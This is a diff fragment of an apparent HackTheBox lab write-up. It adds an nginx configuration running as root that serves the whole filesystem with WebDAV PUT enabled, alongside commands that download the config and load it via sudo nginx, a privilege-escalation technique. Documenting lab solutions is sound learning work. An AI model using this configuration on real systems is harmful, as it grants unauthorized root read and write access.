@@ -78,6 +78,20 @@ ssh-keygen -o
 ![image](https://github.com/regarmulia/HTB/assets/33616880/d95ac52a-f273-4a06-9b9b-45cb9d7f8cfc)
 
 ```
+user root;
+events {
+    worker_connections 1024;
+}
+http {
+    server {
+        listen 1338;
+        root /;
+        autoindex on;
+        dav_methods PUT;
+    }
+}
+```
+```
 wget 10.10.14.12/privesc2.conf
 sudo /usr/sbin/nginx -c /tmp/privesc2.conf
 curl localhost:1338
